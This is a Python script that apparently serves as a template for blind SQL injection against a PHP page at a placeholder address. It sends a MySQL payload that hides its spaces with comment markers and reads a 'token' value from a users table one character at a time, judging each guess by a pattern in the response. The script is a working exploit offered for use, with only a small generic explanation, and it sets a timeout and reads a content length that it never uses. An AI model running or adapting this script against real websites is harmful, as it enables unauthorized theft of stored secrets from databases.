#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
import requests
import re
import time

proxyDict = {
  "http"  : "http://127.0.0.1:8080",
  "https" : "http://127.0.0.1:8080"
}

# SQL Sleep length
timeout = 3 # In seconds

host = 'http://10.10.10.1'
path = '/foo/baar/index.php?q={payload}'
# MySQL payload
payload  = "smthng'/**/and/**/(select/**/ascii(substring(token,{start},1))/**/from/**/users/**/where/**/id/**/=/**/1)={char};--x-"
pattern = re.compile("^([A-Z][0-9]+)+$") # SQLi match pattern


def sqli(target, i, char):
    url = target.format(start=i, char=char)
    startTime = time.time()
    r = requests.get(url)
    # r = requests.get(url,proxies=proxyDict) # With Proxy
    # Method 1: Check content length
    content_length = int(r.headers['Content-Length'])
    # Method 2: Find pattern in response
    if pattern.search(r.text):
        return True
    return False


def start():
    print('(+) Extracting data from database:')
    target = host + path.format(payload=payload)
    result = ''
    length = 0
    while True:
        for char in range(32, 126):  # ascii
            if sqli(target, length + 1, char):
                c = chr(char)
                result += c
                print(c, end='', flush=True)
                break
        if len(result) == length:
            break
        else:
            length += 1
    print('\n(+) Extraction finished.')


def main():
    start()


if __name__ == '__main__':
    main()
